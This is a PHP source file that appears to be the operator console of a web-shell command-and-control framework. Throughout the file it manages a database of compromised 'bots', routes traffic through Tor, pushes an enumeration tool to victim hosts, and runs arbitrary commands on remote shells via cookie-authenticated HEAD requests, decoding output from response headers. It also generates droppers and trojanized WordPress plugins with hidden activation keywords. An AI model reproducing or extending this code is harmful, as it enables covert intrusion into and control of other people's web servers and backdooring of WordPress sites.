<?php

require_once "lib/classes.inc.php";

//crypto
use crypto\decryptShellResponses\decryptor;
//end crypto

//pipe dream.
use fake_the_landing\randomDefaultPage;
//end pipe dream.

// communications
use curlStuff\defaultClient\genericChunkFileTransfer;
use curlStuff\defaultClient\genericClientExecuteCommands;
use curlStuff\mainCurl;
use curlStuff\validateMeMore\talkToMeDamnit;
use userAgents\agentsList;

//end communications

// might remove this, since tor is what should be used.
// end stuff.

// droppers
use new_bots\makeMeSlim\slimDropper;
use new_bots\wordpressPlugins\makeMeWordPressing;

// end droppers

//graphics and shit
use logos\art\artisticStuff;
use logos\menus\mainMenu;

//end graphipcs and shit.

$d = default_config;
$randomize_landing = new randomDefaultPage();
$configs = $d->exportConfigConstants();
$l = new artisticStuff(true);
$m = new mainMenu();
$agents = new agentsList();
$curl = new mainCurl(true, $configs['tor']);

$choices = [
    "postgres" => $configs['pg_presets'],
    "sqlite" => $configs['sqlite_presets']
];
if (str_contains(SQL_USE, "PGSQL")) {
    define("database", new database\slopPgSql($choices['postgres']['pg_host'], $choices['postgres']['pg_user'], $choices['postgres']['pg_pass']));
} else {
    define("database", new database\slopSqlite($choices['sqlite']['sqlite_db']));
}
var_dump(database->firstRun());
$randomize_landing->whyNot();
readline("Press enter to continue.");
function pagination()
{
    $page = 0;
    $itemsPerPage = 10;
    $lastId = 0;
    do {
        $lastId = database->grabAndFormatOutput($lastId, $itemsPerPage, "bot");
        $lastPage = ($lastId < $itemsPerPage);
        echo "Current Page: " . ($page + 1) . "\n";
        echo "Press 'n' for next, 'b' for back, or 'q' to quit and return to the main menu: ";
        $handle = fopen("php://stdin", "r");
        $action = trim(fgets($handle));
        fclose($handle);
        if (is_numeric($action)) {
            return $action;
        }
        if ($action === 'n') {
            if (!$lastPage) {
                $page++;
                $lastId = database->grabAndFormatOutput($lastId, $itemsPerPage, "bot");
                $lastPage = ($lastId < $itemsPerPage);
                if ($lastPage) {
                    echo "You're on the last page.\n";
                }
            } else {
                echo "You're already on the last page.\n";
            }
        } elseif ($action === 'b') {
            if ($page > 0) {
                $page--;
                $lastId -= $itemsPerPage;
                $lastId = database->grabAndFormatOutput($lastId, $itemsPerPage, "bot");
            } else {
                echo "You're on the first page. Cannot go back any further.\n";
            }
        } elseif ($action === "q") {
            return 0;
        }
    } while ($action !== "q");
}

$l->prepareFrames();
$l->displayLogo();
$current = null;
while (true) {
    system(CLEAR);
    $l->displayStaticAsciiLogo();
    $m->menu();
    $c = strtolower(trim(readline("->")));
    switch ($c) {
        case str_starts_with($c, "sys") !== false:
            system(CLEAR);
            $m->enumSystemMenu();
            $selectedEntry = pagination();
            $bot = database->insertData(["action" => "grabBot", "botID" => $selectedEntry]);
            $a = new genericChunkFileTransfer([
                "base_uri" => sprintf("%s://%s", $bot[0]['proto'], $bot[0]['rhost']),
                "timeout" => 5,
                "allow_redirects" => false,
                "proxy" => [
                    "http" => $d->tor,
                    "https" => $d->tor
                ],
                "cookies" => true,
                "protocols" => $bot[0]['proto'],
                "strict" => false,
                "referrer" => false,
                "track-redirects" => true
            ]);
            $a->chunkTransferFile($bot[0]['uri'],
                [
                    'headers' => [
                        "User-Agent" => $bot[0]['agent']
                    ]
                ],
                [
                    "uuid" => $bot[0]['uuid'],
                    "cname" => $bot[0]['cname'],
                    "cval" => $bot[0]['cvalue'],
                ],
                "lib/tools/enumSystem/enumerateSystem"
            );
            break;
        case str_starts_with($c, "rev") !== false:
            system(CLEAR);
            $m->reverseConnectionsMenu();
            break;
        case str_starts_with($c, "com") !== false:
            system(CLEAR);
            // need to add handling into this script for the new script filenames.
            $selectedEntry = pagination();
            $bot = database->insertData(['action' => "grabBot", "botID" => $selectedEntry]);
            $coms = new genericClientExecuteCommands([
                    "base_uri" => sprintf("%s://%s", $bot[0]['proto'], $bot[0]['rhost']),
                    "timeout" => 5,
                    "allow_redirects" => false,
                    "proxy" => [
                        "http" => $d->tor,
                        "https" => $d->tor
                    ],
                    "cookies" => true,
                    "protocols" => $bot[0]['proto'],
                    "strict" => false,
                    "referrer" => false,
                    "track-redirects" => true
                ]
            );
            $m->commandTypes();
            $type = readline("Which of the 3 options would you like to select (this will enter into a loop, so you can continue to execute commands press q to quit): ");
            do {
                $bot = database->insertData(['action' => "grabBot", "botID" => $selectedEntry]);
                $action = readline("What would you like to execute: ");
                switch (true) {
                    case $action === "q":
                    case $action === "quit":
                        echo "Quitting.";
                        break;
                    case $action === "clear":
                        system(CLEAR);
                        break;
                    case $action === "help":
                        echo <<<HELPER
press \033[0;32mq\033[0m or \033[0;32mquit\033[0m to exit this loop.
\033[0;33mclear\033[0m to clear the current screen.
or \033[0;34mhelp\033[0m to show this message.
HELPER.PHP_EOL;
                        break;
                    default:
                        try {
                            $command = $coms->head($bot[0]['uri'],
                                [
                                    'headers' => [
                                        "User-Agent" => $bot[0]['agent']
                                    ]
                                ],
                                [
                                    "cr" => $type,
                                    "command" => $action,
                                    "uuid" => $bot[0]['uuid'],
                                    "cname" => $bot[0]['cname'],
                                    "cval" => $bot[0]['cvalue'],
                                ]
                            );
                        } catch (Exception $e) {
                            echo $e->getMessage() . PHP_EOL;
                            readline("Exception occured....... Press enter to continue." . PHP_EOL);
                            break;
                        }
                        if (!is_null($command->getHeaderLine('D'))) {
                            database->insertData(["action" => "updateBot", "botID" => $selectedEntry, "newUri" => sprintf("/%s", $command->getHeaderLine('NewName'))]);
                            foreach (explode(":", base64_decode($command->getHeaderLine("D"))) as $output) {
                                echo sprintf("\033[0;35m%s\033[0m", str_replace(";", "\n", trim($output))) . PHP_EOL;
                            }
                        } else {
                            echo "Command failed successfully....." . PHP_EOL;
                        }
                }
            } while ($action !== "q");
        case str_starts_with($c, "a") !== false:
            system(CLEAR);
            $m->addHostMenu();
            database->insertData(
                [
                    "action" => "add_bot",
                    "rhost" => trim(readline("Remote host: ")),
                    "uri" => trim(readline("URI (example: /home/slop.php)")),
                    "uuid" => trim(readline("UUID (should be the uuid associated with the dropper/shell in the database.): ")),
                    "os_flavor" => trim(readline("OS: ")),
                    "cname" => trim(readline("CNAME: ")),
                    "cval" => trim(readline("CVAL: ")),
                ]
            );
            break;
        case str_starts_with($c, "cr") !== false:
            system(CLEAR);
            $m->dropperMenu();
            $c = trim(strtolower(readline("-> ")));
            switch ($c) {
                case str_contains($c, "small") !== false:
                    system(CLEAR);
                    $act_word = trim(readline("Activation Keyword: "));
                    if (is_null($act_word) or $act_word === "") {
                        $act_word = bin2hex(openssl_random_pseudo_bytes(24));
                    }
                    $trj = new makeMeWordPressing($act_word, $agents->getRandomAgent(), bin2hex(openssl_random_pseudo_bytes(10)), bin2hex(openssl_random_pseudo_bytes(50)));
                    $a = $trj->createSmallTrojanWordpress();
                    database->insertData([
                            "action" => "add_press",
                            "zip" => $a['TrojanPlugin'],
                            "activator" => $a['ActivationWord'],
                        ]
                    );
                    readline("Press the any key to continue.");
                    break;
                case str_contains($c, "chonker") !== false:
                    system(CLEAR);
                    $trj = new makeMeWordPressing(null, $agents->getRandomAgent(), bin2hex(openssl_random_pseudo_bytes(10)), bin2hex(openssl_random_pseudo_bytes(50)));
                    $yay = $trj->createChonker();
                    database->insertData([
                        "action" => "add_press",
                        "zip" => $yay['TrojanPlugin'],
                        "UUID" => $yay['uuid'],
                        'CookieName' => $yay['CookieName'],
                        'CookieVal' => $yay['CookieValue'],
                        'AllowedAgent' => $yay['AllowedAgent']
                    ]);
                    readline("Press the any key to continue.");
                    break;
                default:
                    system(CLEAR);
                    $trj = new slimDropper($agents->getRandomAgent(), $configs['alpha_chars']);
                    $a = $trj->generateDropper();
                    database->insertData([
                        "action" => "add_dropper",
                        "location_on_disk" => $a['dropper'],
                        "post_var" => $a['post_variable'],
                        "cookiename" => $a['cookie_name'],
                        "user_agent" => $a['user_agent']
                    ]);
                    readline("Press the any key to continue.");
                    break;
            }
            break;
        case str_starts_with($c, "ch") !== false:
            system(CLEAR);
            $m->validateHost();
            $validateMeMore = new talkToMeDamnit();
            try {
                $validateMeMore->checkMultiHost(database->grabOrFormatOutput(['type' => 'all_bots'])["bots"]);
            } catch (Exception $e) {
                echo $e . PHP_EOL;
            }
            break;
        case str_starts_with($c, "at") !== false:
            system(CLEAR);
            $m->addToolMenu();
            break;
        case str_starts_with($c, "lt") !== false:
            system(CLEAR);
            //@todo need to add pagination here.
            $m->grabToolsMenu();
            break;
//        case str_starts_with($c, "gp") !== false:
//            system(CLEAR);
//            //@todo need to add pagination here.
//            $m->grabProxyMenu();
//            break;
//        case str_starts_with($c, "r") !== false:
//            system(CLEAR);
//            $m->resetProxyMenu();
//            break;
        case str_starts_with($c, "gc") !== false:
            system(CLEAR);
            $m->generateCertMenu();
            break;
        case str_starts_with($c, "o") !== false:
            system(CLEAR);
            echo "Current Options: " . PHP_EOL;
            print_r($configs);
            readline("Press enter to continue.");
            break;
        case str_starts_with($c, "ac") !== false:
            system(CLEAR);
            break;
        case str_starts_with($c, "q") !== false:
            system(CLEAR);
            foreach ($m->goodBye() as $bye) {
                echo "\033[0;34m{$bye}\033[0m" . PHP_EOL;
            }
            die();
        default:
            echo "\033[0;31mThat is not a valid command.";
            break;
    }
    $c = "";
}
